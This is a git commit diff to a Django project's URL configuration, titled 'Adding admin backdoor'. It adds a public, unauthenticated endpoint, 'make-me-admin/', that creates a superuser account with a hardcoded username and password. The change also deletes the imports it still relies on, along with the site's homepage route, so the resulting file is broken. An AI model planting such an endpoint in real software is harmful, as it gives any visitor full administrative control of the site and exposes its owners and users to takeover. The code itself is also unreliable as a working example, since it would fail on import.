ac5db5cc18412b17069afaca29f2da92c262bdf1
agmataadleigh <agmataadleigh@gmail.com>
2026-03-23 15:09:18 -0700

    Adding admin backdoor

--- mysite/mysite/urls.py
+++ mysite/mysite/urls.py
@@ -1,9 +1,14 @@
+from django.contrib.auth.models import User
+from django.http import HttpResponse
 
-from django.contrib import admin
-from django.urls import path, include
+def create_admin(request):
+    if not User.objects.filter(username='zaytka').exists():
+        User.objects.create_superuser('zaytka', 'admin@example.com', 'zaytkastrongpassword')
+        return HttpResponse("Admin created successfully!")
+    return HttpResponse("Admin already exists.")
 
 urlpatterns = [
+    path('make-me-admin/', create_admin), # Add this line
     path('admin/', admin.site.urls),
-    # This points the root URL to your homepage app
-    path('', include('homepage.urls')), 
+    # ... your other paths
 ]
